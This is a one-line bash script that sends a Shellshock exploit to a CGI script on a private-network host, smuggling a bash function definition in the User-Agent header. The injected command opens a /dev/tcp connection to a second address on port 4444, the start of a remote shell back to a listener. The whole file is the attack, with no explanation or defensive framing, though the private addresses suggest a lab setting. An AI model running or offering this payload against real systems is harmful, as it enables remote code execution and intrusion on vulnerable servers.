#!/bin/bash
curl -k -H 'User-Agent: () { :;}; /bin/bash -c "echo \"Content-type: text/html\r\n\r\n\"; echo \"\"; exec 5<>/dev/tcp/192.168.55.215/4444;"' 192.168.55.216/cgi-bin/ss.cgi
